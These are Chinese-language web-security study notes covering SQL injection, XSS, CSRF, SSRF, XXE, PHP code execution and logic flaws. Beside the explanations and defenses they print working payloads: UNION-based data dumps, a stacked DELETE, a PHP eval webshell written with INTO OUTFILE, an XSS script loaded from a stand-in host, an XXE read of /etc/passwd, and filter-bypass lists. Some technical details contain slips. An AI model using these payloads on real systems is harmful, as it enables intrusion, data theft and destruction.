SQL注入漏洞

SQL注入漏洞原理

  1. sql注入原理

    sql注入是指通过把恶意的sql命令插入到web表单中或者输入域名处或者请求查询的字符串中，以达到来欺骗服务器来执行恶意的sql命令的目的。

  2. sql注入简单验证方式

    简单注入验证： 1.在变量后面加 ‘ 2. and 1=1 3. and 1=2 如果页面中的mysql报错，则存在sql注入漏洞。

  3. sql5.0及5.0以下版本区别

    在mysql 5.0以后的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。包括schemata,tables,columns，而5.0 以前只能暴力破解表名。5.0以下是多用户单操作，5.0以上是多用户多操作。

  4. sql的增删改查

    select 列名称 from 表名称 where 字段1=’条件1’ and 字段2=’条件2’
    insert into table name (列1,列2,列3…) values(值1,值2,值3…)
    update 表名称 set 列名称=新值 where 列名称=某值
    delete from 表名称 where 列名称=值

  5. mysql 常用函数

    user() 查看当前mysql登录用户名
    database() 查看当前使用的mysql数据库库名
    version() 查看当前mysql版本
    group_concat() 将group by 产生的同一分组的值连接起来，返回一个字符串结果
    concat() 将两个字符串连接为一个字符串
    limit m,n 从m行开始(m行不算)，到m+n行
    if(a,b,c) 如果条件a成立，执行b，都否则执行c(当if被过滤时有select case where 条件 then 代码1 else 代码2 end)

  6. mysql注释

    #或–空格或/*/
    内联注释/    ! sql语句 */，用于空格被过滤绕过

  7. sql注入类型

    数字型 select * from table where id = 用户输入id
    字符型 select * from table where id =’用户输入id’

  8. 基于报错注入的漏洞利用方式

    1.利用order by 判断字段数 ?id=1 order by num –+
    2.利用union select 联合查询判断当前数据库名，版本信息 ?id=-1’ union select 1,group_concat(database(),0x7e,version()),3 –+
    3.利用union select 联合查询获取表名 ?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() –+
    4.利用 union select 联合查询获取字段名 ?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’表名’
    5.利用union select 联合查询获取字段值 ?id=-1’ union select 1,group_concat(字段名1,字段名2,字段名3…) from 字段名 –+

  9. 基于盲注的漏洞利用方式
    Blind SQL 是注入攻击的一种方式，向数据库发送true或false这样的问题，并根据应用程序返回的信息判断结果，有时候web应用会显示，后端数据库执行SQL查询返回的错误信息。若数据库没有输出数据到web页面，攻击者会询问一些列的true或false问题，强制从数据库中获取数据。

    基于时间的盲注

    关键语句 if(ascii(substr(database(),1,1)=115,1,sleep(3)));：当数据库名的第一个字母的ascii码值等于115时，执行一次sleep(3)函数等待3秒，否则正常执行。
写时间盲注脚本爆破。

    基于布尔的盲注

    关键语句 select length(database()) > 3;：当数据库的长度大于3时返回true，否则false。
select substr(database(),1,1) = 'a';：当数据库名的第一个字符是a时返回true，否则false。
select ascii(substr(database(),1,1)) < 115;：当数据库名的第一个字符的ascii码小于115时返回true，否则false。
写布尔盲注脚本爆破。

  10. mysql读写文件

    读取前提

    * 用户权限足够高，最好是root权限
* secure_file_priv 不为 null，这个参数用来限制数据导入和导出操作的效果，例如执行load data，into outfile语句和load_file()函数，这些操作都需要用户有file文件权限。
1.如果这个参数为空，这个变量没有效果。
2.如果这个参数设定为一个目录名，mysql服务只允许这个目录中执行文件的导入和导出操作。这个目录必须存在，mysql服务不会创建它。
3.如果这个参数为null，mysql服务会禁止导入和导出操作。这个参数在5.7.6版本被引入。

    读文件(绝对路径)

    union select 1,load_file("F:\\Test\\test.txt"),3 --+

    写文件(绝对路径)

    union select 1,'<?php @eval($_POST['x']);?>',3 into outfile 'F:\\Test\\test.php' --+

  3. 基于宽字节注入的漏洞利用方式

    1. 注入原理
      GBK占用两个字节，ASCII占用一个字节，PHP中的编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。
      %df，会被PHP当中的addslashes函数转义为”%df"，”"在URL里的编码是”%5c”，也就是说”%df”会被转义成”%df%5c%27”。倘若网站的字符集是GBK，MYSQL使用的编码也是GBK的话，就会被认为是”%df%5c%27”是一个宽字符，也就是”縝”。
    2. 注入方式
      1%df’ union select 1,user(),database() –+

  4. 基于二次注入的漏洞利用方式

    注入原理

    1. 插入恶意数据：在进行数据库插入数据时，对其中的特殊字符做了转义处理，在写入数据时，又保留了原来的数据。
2. 引用恶意数据：在取数据时没有进行校验验证的处理，导致之前被插入的恶意数据被引用，从而引发注入。

    ＞ 注入方式

    一般出现在用户修改账户的逻辑接口处，比如某个系统的超级管理员账号是admin，那么在敏感字符未被完全过滤的情况下，可以注册一个admin#账号，然后在修改密码的逻辑接口处重置密码，因为#注释了用户名后面的内容，所以相当于直接修改了admin的密码。

  5. 基于堆叠注入的漏洞利用方式

    注入原理

    在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。

    注入方式

    1. 1;show databases;#
2. 1';show tables;#
3. 1";show columns from `表名`;#护着1";desc `表名`;#

* 对用户的输入内容进行转义(addskashes(),mysql_real_escape())
* 对用户的输入内容进行关键字过滤(preg_replace())，限制用户输入的长度
* 使用sql预处理语句(pdo)，对sql语句先进行预编译处理，在进行参数绑定，最后传入参数
* 部署防火墙

XSS漏洞

恶意攻击者往web页面里插入恶意的script代码，当用户浏览该页面之时，嵌入web页面的script代码会被执行，从而达到恶意攻击用户的目的。
xss漏洞获取cookie并接受web界面的平台，xss能做js能做的所有事情，包括但不限于窃取cookie，后台增删改文章，钓鱼，利用xss漏洞进行传播，修改网页代码，网站重定向，获取用户信息等。

反射型xss

反射型xss又叫非持久性xss，这种攻击具有一次性。攻击者通过邮件等形式将包含xss代码的链接发送给正常用户，当用户点击时，服务器接受该用户的请求并进行处理，然后把带有xss的代码发送给服务器，服务器解析执行代码，触发xss漏洞。
如,<script>alert(document.cookie);</script>

存储型xss

存储型xss又称之为持久性xss,攻击脚本存储在目标服务器的数据库中，具有更强的隐蔽性。攻击者在论坛，博客，留言板中，发帖的过程中嵌入xss攻击代码，帖子被目标服务器存储在数据库中，当用户进行正常访问时，触发xss代码。
如,<script src=http://xxx.com/xxs.js></script>

dom型xss

dom型xss是基于文档对象模型的一种漏洞，使用dom动态访问更新文档的内容，结构及样式，通过html dom对树上的所有节点进行修改，服务器响应不会处理攻击者脚本，而是用户浏览器处理这些响应时，dom对象就会处理xss代码，触发xss代码。
如,<img src=1 onerror=alert('hello world')>

csrf漏洞

csrf原理

CSRF(Cross-site request forery,跨站请求伪造)攻击原理是网站通过隐式认证用户时，只要不关闭浏览器或者退出，以后访问相同网站时，浏览器会自动在请求中附带认证信息。如果浏览器被其他网页控制请求了这个url，那么可能会执行一些用户不希望的功能。利用用户的合法身份，以目标用户的名义进行非法操作。
如：
1.用户C打开浏览器访问受信网站A，输入用户名和密码登录网站A
2.在成功验证用户信息后，网站A产生cookie信息保存在本地并返回给浏览器，此时用户登录网站A成功
3.用户在未退出网站A前，在同一浏览器中，访问了带有恶意代码的网站B
4.网站B收到用户C的请求后，并发出了一个请求请求访问网站A
5.浏览器收到了恶意代码后，根据网站B的请求，在用户不知情的情况下，带着用户的cookie访问了网站A，网站A并不知道请求是由带有恶意代码的网站B发起，所以会根据用户C的coookie信息以及请求内容处理该请求，导致来自网站B的恶意代码被执行。

csrf的漏洞检测

最简单的方法就是抓取一个正常的请求，去掉Referer字段后重新提交，如果该提交还有效，则存在csrf
检测工具有：CSRFTester，CSRF Request Builder

csrf绕过referer

> 原理
    HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上referer，告诉服务器我是从哪个页面链接过来的，服务器可以借此获得一些信息用于处理。当用户点击被构造好的csrf利用页面，那么在执行用户对应操作时，提交的http请求中就有对应的referer值，此时服务器判断referer值是否与服务器的域名信息有关，如果不相关则不执行操作。
> 方法
    1.referer条件为空条件时
        利用ftp://,http://,https://,file://,javascript:,data:这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。
        利用data:协议,bese64编码,解码即可看到代码,利用https协议,https向http跳转的时候Referer为空
    2.判断Referer是某域情况下绕过
    比如你找的csrf是xxx.com,验证的referer是验证的*.xx.com  
    可以找个二级域名之后在把文章地址发出去就可以伪造
    3.判断referer是否存在某关键字
    referer判断存在不存在google.com这个关键词,在网站新建一个google.com目录,把CSRF存放在google.com目录,即可绕过
    4.判断referer是否含有某域名
    同理，在网站新建一个相同的域名目录,把CSRF存放在域名目录里,即可绕过

csrf的防御措施

  1. 提交验证码
    验证码防御是一种二次验证，被认为是对抗csrf最简单且有效的防御方法。csrf是在用户不知情的情况下完成的对应操作，而验证码强制用户与服务器应用进行交互，才能完成操作，但是处于对用户体验的考虑，不可能每一个操作都加入验证码，所以验证码只是作为辅助手段。
  2. referer check
    referer check主要是用于防止盗链，也可以用来检查请求是否来自合法的源，如果referer不是当前系统的域就极有可能受到csrf的攻击，同时从http跳转到https时服务器无法获取到referer值。
  3. token防御
    在HTTP请求中以参数的形式添加一个随机产生的Tokend，并在服务器建立一个拦截器来验证这个Token，假设请求中没有这个Token或者Token的内容不对，则被认定为是csrf攻击而拒绝该请求。同时Token的值要足够随机，以及用POST传参。

csrf和xss的区别

  1. csrf需要登录后操作，xss不需要
  2. xss只要是针对客户端，csrf针对服务器
  3. xss是利用合法用户获取其信息，csrf是伪造成合法用户发送请求
  4. xss产生的主要原因是用户没有正确过滤，csrf产生的主要原因是采用的隐式的认证

文件上传漏洞

文件上传漏洞定义

文件上传漏洞是指用户传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。如果服务器的处理逻辑不够安全，没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传人员PHP文件，能够将这些PHP文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本，会导致严重的后果。

文件上传漏洞产生原因

* 服务器配置不当
* 开源编辑器上传漏洞
* 本地文件上传限制被绕过
* 过滤不严或绕过
* 文件解析漏洞导致文件执行
* 文件路径被截断

文件包含漏洞
> 文件包含漏洞原理
    服务器执行PHP文件时，文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，通过文件包含函数加载另一个文件中的PHP代码，包含其他恶意文件，并且当PHP来执行，导致了执行了非预期的代码
> 产生文件包含漏洞的函数
    * require：函数出现错误时，会直接报错并且退出程序
    * require_once：出错时退出，且只包含一次
    * include：函数出现错误时，会抛出警告然后继续运行
    * include_once：出现错误时，会抛出警告，且只包含一次
    include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。

远程命令执行(代码执行)

在PHP中，有时需要调用一些执行命令的函数，如：eval(),assert(),preg_replace(),create_function(),unserialize(),usort(),array_reduce(),${phpinfo()}等，如果存在一个使用这些函数且未对可被用户控制的参数进行检查过滤的页面，那么这个页面就可能存在远程命令执行漏洞。
> eval()和assert()
    eval()和assert()函数都可以执行参数内部的代码，且可以接受参数作为字符串。如：
    <?php @eval($_POST['shell']);?>
    <?php @assert($_POST['shell'])?>
    eval()传入的参数必须为php代码，且要以分号结尾；assert()是直接将传入的参数当成PHP代码执行，不需要分号结尾。
    php官方在php7中更改了assert函数。在php7.0.29之后的版本不支持动态调用。
> preg_replace()
    preg_replace('正则规则','替换字母','替换目标')，如：
    <?php preg_replace("/test/e",$_POST['shell'],"just test");?>
    RCRE修饰符e：preg_replace()在进行了对替换字符串的后向引用替换后，将替换后的字符串作为PHP代码执行，并使用执行解雇作为实际参与替换的字符串。版本在5.5.0之前，5.5.0之后/e修饰符已经被启用了，使用了preg_replace_caliback()代替。而7.7.0以后不再支持/e修饰符，用preg_replace_caliback()代替。
> array_map()
    将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后带有新值的数组。如：
    <?php
        $func = $_GET['func'];   //传入自定义函数
        $cmd = $_POST['cmd'];     //传入变量
        $array[0] = $cmd;
        $new_array = array_map($func,$array);
        echo $new_array;
    ?>
> 动态函数
    利用动态函数执行php函数可以由字符串拼接而成，如：
    <?php
        $a = $_GET['a'];
        $b = $_GET['b'];
        echo $a($b);
    ?>
    // a=assert&b=phpinfo()

系统命令执行

利用PHP的系统命令来执行函数调用系统命令并执行，之类函数有system(),exec(),shell_exec().passthru(),penti_exec(),popen(),proc_pen()等，此外还有反引号` `可以执行命令执行，这种方式实际上是调用shell_exec()来执行。
> 执行函数
    1. system()：执行外部程序，并且显示输出
    2. exec()：执行一个外部程序
    3. shell_exec()：通过shell环境执行命令，并且将完整的输出以字符串的方式返回
    4. passthru()：执行unix系统命令并且显示原始输出
    5. pcntl_exec()：在当前进程空间执行指定程序
    6. popen()：打开进程文件指针
    7. proc_open()：执行一个命令，并且打开用来输入/输出的文件指针
> 执行特殊字符
    1. cmd1|cmd2：无论cmd1是否执行成功，cmd2都将被执行
    2. cmd1;cmd2：无论cmd1是否执行成功，cmd2都将被执行
    3. cmd1||cmd2：仅仅在cmd1执行失败时才会执行cmd2
    4. cmd1&&cmd2：仅仅在cmd1执行成功后才会执行cmd2
    5. cmd2$(cmd1)：echo $(whoami)或者$(touch test.sh;echo 'ls'>test.sh)
    6. `cmd`：用于执行特定命令，如`whoami`
    7. >(cmd)： <(ls)
    8. <(cmd)： >(ls)

ssrf漏洞

ssrf形成的原因大都是由于服务器端提供了从其他服务器应用获取数据的功能且没有对目标地址进行过滤和限制，导致攻击者可以传入任意的地址来让后端服务器发送请求，并返回请求的数据。比如从指定的url地址获取到网页文本内容，加载指定地址的图片，下载文件，读取文件内容等。是一种由攻击者构造请求，服务器发起的构造请求伪造，利用存在缺陷的web应用作为代理攻击远程和本地服务器。最常见的例子：攻击者传入一个未经验证的URL，后端代码直接请求这个URL，就会造成SSRF。

ssrf漏洞利用方式

* 对外网，服务器所在内网，本地进行端口扫描，获取Banner信息，收集内网web应用指纹识别
* 测试运行在内网或本地的应用程序，获取内网系统弱口令进行内网漫游，或者对有漏洞的内网web应用实施攻击获取webshell
* 利用ftp://,file:///,dict://等协议进行攻击

ssrf漏洞函数

* file_get_contents()
* fsockopen()
* curl_exec()

漏洞可能发生点

* 通过URL地址分享网页内容
* 文件处理，编码处理，转码等服务
* 在线翻译
* 通过URL地址加载与下载图片
* 图片，文章收藏功能
* 未公开的api实现以及其他调用URL的功能
* 网站邮箱收取其他邮箱邮件功能
* 从URL关键字寻找：
    share,wap,url,link,src,source,target,u,3g,display,sourceURL,imageURL,domain等

ssrf漏洞绕过方式

1. @绕过，如http://example.com@10.10.10.10与http://10.10.10.10请求相同
2. ip转换绕过，换成10进制，2进制，8进制等(tools.bugscaner.com/iptoint.html)
3. 短网址绕过
4. 协议绕过，如file://和gopher://和dict://
5. xio.io绕过，如http://10.10.10.10.xip.io = 10.10.10.10(xip.name)
6. 句号绕过，如10。10。10。10 = 10.10.10.10
7. ipv6绕过，如http://[::1]:80=127.0.0.1:80
8. 添加端口绕过，如10.10.10.10:80
9. 利用Enclosed alphanumerics绕过()

ssrf漏洞防御方法

  1. 统一返回错误信息
  2. 限制请求的协议和端口为http常用端口
  3. 不用限制30x重定向
  4. 设置url白名单或者限制内网ip
  5. 过滤返回信息，验证远程服务器对请求的响应
  6. 设置不需要的协议，仅允许http和https请求

CSRF和SSRF的区别

csrf是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的referer字段校验不严，导致攻击者可以利用用户的cookie信息伪造用户请求发送至服务器。
ssrf是服务器对用户提供的url过于信任，没有对攻击者提供的url进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或者其他服务器

XML基础

XML是一种用于标记电子文件使其具有结构性的可扩展标记语言(EXtensible Markup Language)，是一种非常灵活的语言，类似于HTML语言，但是没有固定的标签，所有的标签都可以自定义，其设计的宗旨是传输数据，而不是像HTML那样显示数据。XML不会做任何事情，它是被设计用来结构化，存储以及传输信息，也就是XML文件所携带的信息，需要被其他语言或者程序来解析，才能发挥作用。

XML语法

1. XML文档必须有一个根元素
2. XML元素都必须要有一个关闭的标签
3. XML标签对大小写敏感
4. XML元素必须被正确的嵌套
5. XML属性值必须加引号

XML文档结构

XML文档结构包括XML声明，DTD文档类型定义(可选)，文档元素，如：
<?xml version="1.0" encoding="utf-8"?>         //文档声明
<!--女孩-->
<!DOCTYPE girl[
    <!ELEMENT girl (hair,eye,face,summary)>
    <!ELEMENT hair        (#PCDATA)>
    <!ELEMENT eye       (#PCDATA)>             //DTD文档定义类型
    <!ELEMENT face        (#PCDATA)>
    <!ELEMENT summary       (#PCDATA)>
]>
<girl age="16">
<hair>长头发</hair>
<eye>黑眼睛</eye>                              //文档元素
<face>漂亮的脸庞</face>
<summary>美丽可爱的</summary>
</girl>
其中<?xml ?>是一个xml标记，用于告诉浏览器这个文档是xml文档；version="1.0"，version属性用于说明当前xml文档的版本，version属性是必须的；encoding="utf-8"，encoding属性用于说你当前xml文档使用的是字符编码集，xml接下会使用这个编码来解析xml文档。encoding是可选属性，默认UTF-8。<!--这是注释-->

DTD声明

> 内部声明
    DTD被包含在XML源文件中，应当使用语法包装在一个DOCTYPE声明中
语法：<!DOCTYPE 根元素 [元素声明]>，例如：
<!DOCTYPE girl[

]>

> 外部声明
    DTD位于XML源文件的外部，应当使用语法封装在一个DOCTYPE的定义中
语法：<!DOCTYPE 根元素 SYSTEM "文件名">，例如：
<>xml version="1.0" encoding="utf-8">

PCDATA和CDATA

> PCDATA
    PCDATA指的是可以被解析的字符数据，在XML中有5个预定义的实体引用：
    &lt;                       <                     小于
    &gt;                       >                     大于
    &amp;                      &                     和号
    &apos;                     .                     省略号
    &quot;                     "                     引号
严格讲，XML中仅有"<"和"&"是非法的，其他的都是合法的，但是一般都把它们替换成实体引用。

> CDATA
    CDATA指的是不能被解析的字符数据，在XML元素中，"<"和"&"是非法的，"<"会产生错误，因为解析器会把该字符解释为新元素的开始，"&"也会产生错误，因为解析器把该字符解释为字符实体的开始，而某些文本，比如javascript代码包含大量的"<"和"&"字符，为了避免错误，可以将脚本代码定义为CDTA，CDATA的部分由"<![CDATA[ ]]>",如：
    <script>
    <![CDATA[
    function test(){
        alert(/test/);
    }
    ]]>
    </script>
    注意：CDATA部分不能包含字符串"]]>"，也不允许嵌套CDATA部分，这样会导致异常的闭合，从而使解析器报错，而且标记CDATA部分结尾的"]]>"不能包含空格或者换行

DTD实体

实体是用于定义引用普通文本或特殊字符的快捷方式的变量。(实体可以看成一个变量，在XML中通过&引用)
> 内部普通实体
    声明： <!ENTITY 实体名称 "实体的值">
    引用： 一个实体的引用，由三部分构成分别是&符号，实体名称，分号,如：
    <?xml version="1.0" encoding="utf-8">
    <!DOCTYPE author[
    <!ELEMENT author ANY>
    <!ENTITY write "babi">
    <!ENTITY copyright "wabi"> 
    ]>
    <author>&write;&copyright;</author>

> 外部普通实体
    声明： <!ENTITY 实体名称 SYSTEM "URI/URL"> 或者 <!ENTITY 实体名称 PUBLIC "DTD标识名" "公用DTD的URI">，如：
    <?xml version="1.0" encoding="utf-8">
    <!DOCTYPE user SYSTEM "http://127.0.0.1/test.dtd">
    <user><username>&xxe;</username><password>test</password></user>
    test.dtd的内容：
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    各个语言一用外部实体支持的一些协议：
    libxml2             php             java             .net
    file                 file             http             file
    http                 http             https             http
    ftp                 ftp             ftp             https
                        php             file             ftp
                        compress.zlib   jar             
                        compress.bzip2  netdoc
                        data             mailto
                        glob            gopher *
                        phar

> 参数实体
            内部： <!ENTITY % 实体名称 "实体值">
    声明：    
            外部： <!ENTITY % 实体名称 SYSTEM "URI">
注意：
    1. 使用 % 实体名 在DTD中定义并且只能在DTD中使用"%实体名;"引用
    2. 只有在DTD文件中，参数实体的声明才能引用其他实体
    3. 和通用实体一样，参数实体也可以外部引用
简单来说，就是参数实体不能像普通实体那样在xml文档中内容进行引用，它的引用范围只能在当前xml文件的DTD声明中，或者是当前的DTD文件中，如：
<?xml version="1.0">
<!DOCTYPE books[
    <!ENTITY % test "<!ENTITY hello "test">">
    %test;
]>
<books>&hello;</books>

xxe(XML EXternal Entity)漏洞产生原理

xxe漏洞发生在应用程序解析xml输入时，没有禁止外部实体的加载，导致可加载恶意外部程序，造成文件读取，命令执行，内网端口扫描，发起dos攻击等。触发点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可以上传恶意的xml文件。

PHP的XXE漏洞产生的条件

1. Libxml的版本尽可能的低，libxml是PHP的xml解析库，因为从2.8.0版本开始，libxml默认是不加载外部实体的，如果要使用较高版本的libxml的话，需要在编写代码的时候对参数做设置。
2. 目标主机没有禁用外部实体的引用。
3.  用户可以控制xml的输入内容

xxe漏洞发现

1. 寻找接受XML作为输入内容的端点，可以通过修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序是否解析了发送的内容，如果解析了，那么可能有xxe攻击漏洞，还可以尝试注入xml预定义的一些实体，看看是否报错，通过报错看是有回显注入还是无回显注入
2. 如果站点解析xml，那么就可以尝试引用实体和DTD
3. 如果可以引用外部实体，则存在xxe漏洞

逻辑漏洞

逻辑漏洞的定义

逻辑漏洞，是因为程序员在编写程序的时候，跟随着人的思维逻辑产生的不足，与传统漏洞的不同在于，逻辑漏洞是用过合法的方式来达到破坏的，比如密码找回，用户登录验证等功能由于程序设计的不足，会产生很多问题，这一类漏洞一般的防护手段或者设备无法阻止，漏洞扫描器也难以发现。

逻辑漏洞产生的原因

程序逻辑不严或者逻辑太复杂，导致一些逻辑分支不能够正常处理或者处理错误，一般出现在任意密码修改，越权访问，密码找回，交易支付金额，身份认证，实名认证等。

常见的逻辑漏洞分类

1. url跳转漏洞
2. 短信轰炸漏洞
3. 任意密码修改漏洞
4. 任意用户登录漏洞
5. 越权漏洞
6. 支付逻辑漏洞
7. 条件竞争漏洞

url跳转漏洞

> 定义
    url跳转漏洞也叫开放重定向漏洞，可以把用户重定向到攻击者自己构造的页面去，简单来说就是跳到任意指定的url

> 产生原因
    服务端未对传入的跳转url进行检查和控制，可能导致可以恶意构造任意一个恶意地址，诱导用户跳转到恶意网站

> url跳转发生的地方
    1. 用户登录、统一身份认证处，认证完后会跳转
    2. 用户分享、收藏内容过后，会跳转
    3. 跨站点认证、授权后，会跳转
    4. 站内点击其它网址链接时，会跳转

> 存在url跳转的参数名
    redirect，redirect_to，redirect_url，url，jump，jump_to，target，to，link，linkto，domain

> url跳转bypass
    1. 利用问号绕过：url=https://www.baidu.com?www.xxxx.com
    2. 利用@绕过：url=https://www.baidu.com@www.xxxx.com
    3. 利用斜杆反斜杠绕过
    4. 利用#绕过
    6. 利用子域名绕过
    7. 利用跳转ip绕过
    8. 利用畸形url绕过
    参考资料：https://www.anquanke.com/post/id/94377

短信轰炸漏洞

> 漏洞产生的原因
    厂商在对信息发送的次数，时间没有做出限制，或者只在前段做了限制，导致可以无限制的发送消息

> 漏洞产生的位置
    登录，注册，找回密码，绑定邮箱，修改账号...一切需要验证的地方

>  bypass
    1. 在moblie后面加%20
    2. 在mobile后面加字幕
    3. 在mobile后面进行多次参数叠加重复
    4. 利用调用接口绕过轰炸限制
    5. 修改cookie绕过轰炸限制
    6. 修改IP绕过轰炸限制
    7. 利用大小写绕过轰炸限制
    8. 修改返回值绕过轰炸限制

任意密码重置漏洞

> 成因
    厂商在对密码修改的时候，未对修改密码的凭证做严格的限制，导致可以被绕过进行任意密码修改

> 场景
    1. 验证码可爆破
    2. 验证码可回传
    3. 验证码未绑定用户
    4. 用户混淆
    5. 本地验证绕过
    6. 跳过验证步骤
    7. token可预测
    8. 同时向多个账户发送凭证
    9. 接收端可篡改
    10. 万能验证码

任意用户登录

> 原理
    逻辑错误导致可以任意用户登录。撞库获得用户名手机或者邮箱，通过验证码登录，若抓包修改接收验证码的手机号或者邮箱，然后使用该验证码能使撞库的用户登录，即可产生漏洞。

> 场景
    1. 手机登录验证码回显
    2. 修改返回包可以登录
    3. 通过遍历id可以登录
    4. sql注入万能密码
    5. 系统默认弱口令
    6. 撞库
    7. cookie混淆

越权漏洞

> 原理
    越权访问漏洞又可以分为横向越权访问漏洞和纵向越权访问漏洞。一般只一个用A可以操作另一个用户B才能做的事情

> 原因
    越权漏洞的成因主要是因为开发人员在对数据的增删改查时对客户端请求的数据过分信任而遗漏了权限的判定

> 平行越权
    水平越权就是相同级别（权限）的用户或者同一角色的不同用户之间，可以越权访问、修改或者删除的非法操作。如果出现此类漏洞，那么将可能会造成大批量数据泄露，严重的甚至会造成用户信息被恶意篡改。比如同一公司的员工A和B，分别只能查看自己的一些个人资料，但是如果系统存在水平越权漏洞，则A可以通过这样个漏洞查看到B的资料。水平权限漏洞一般出现在一个用户对象关联多个其他对象(个人资料、修改密码，订单信息，等)、并且要实现对关联对象的CRUD的时候。开发容易习惯性的在生成CRUD表单(或AJAX请求)的时候根据认证过的用户身份来找出其有权限的被操作对象ID,提供入口，然后让用户提交请求，并根据这个id来操作相关对象。在处理CRUD请求时，往往默认只有有权限的用户才能得到入口，进而才能操作相关对象，因此就不再校验权限了。可悲剧的是大多数对象的ID都被设置为自增整型，所以攻击者只要对相关id加1、减1、直至遍历，就可以操作其他用户所关联的对象了。


> 垂直越权
    查垂直越权又被分为向上越权与向下越权。比如，某些网站，像发布文章、删除文章等操作是属于管理员做的事情，假设一个低权限用户或者根本没权限也可以做相同的事情，这就叫作向上越权,
      向下越权与向上越权恰恰相反，向下越权是一个高级别用户可以访问一个低级别的用户信息。这样做似乎没错，而且很多网站都是这么做的，包括低级别密码也可以被高级别用户掌控，但这样做可以说是完全错误！因为即使权限再低的用户都有他自己的隐私，可能用户为了更方便，会将自己的银行卡号与密码记录在网站中，这些信息都属于用户的隐私。

支付逻辑漏洞

> 原因
    开发人员往往为了方便，直接在支付的关键步骤数据包中直接传递需要支付的金额。而这种金额后端没有做校验，传递过程中也没有做签名，导致可以随意篡改提交金额。

> 场景
    1. 修改购买数量
    2. 修改支付价格
    3. 修改支付对应的商品
    4. 修改支付的状态
    5. 修改附属优惠，领取优惠
    6. 测试数据包未删除

反序列化漏洞

序列化:把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等 函数 : serialize()
反序列化:恢复原先被序列化的变量 函数: unserialize()
反序列化的意义：在传递变量的过程中，有可能遇到变量值要跨脚本传递，如果一个脚本中想要调用之前一个脚本的变量，但是之前一个脚本已经执行完毕，所有的变量和内容释放掉了，这种情况下可以用反序列化将变量和内容恢复回来。反序列化的目的是为了方便数据的传输和存储。

PHP反序列化漏洞

PHP通过serialize()和unserialize()两个函数实现序列化和反序列化。产生反序列化漏洞的原因是在PHP代码中使用unserialize函数反序列化某一个对象，该对象自动执行自定义的魔法方法，如果这些魔法方法中有危险的操作，或者在魔法方法中去调用类中其他带有危险操作的函数，如果危险操作可控，那么就可能会触发PHP反序列化漏洞。
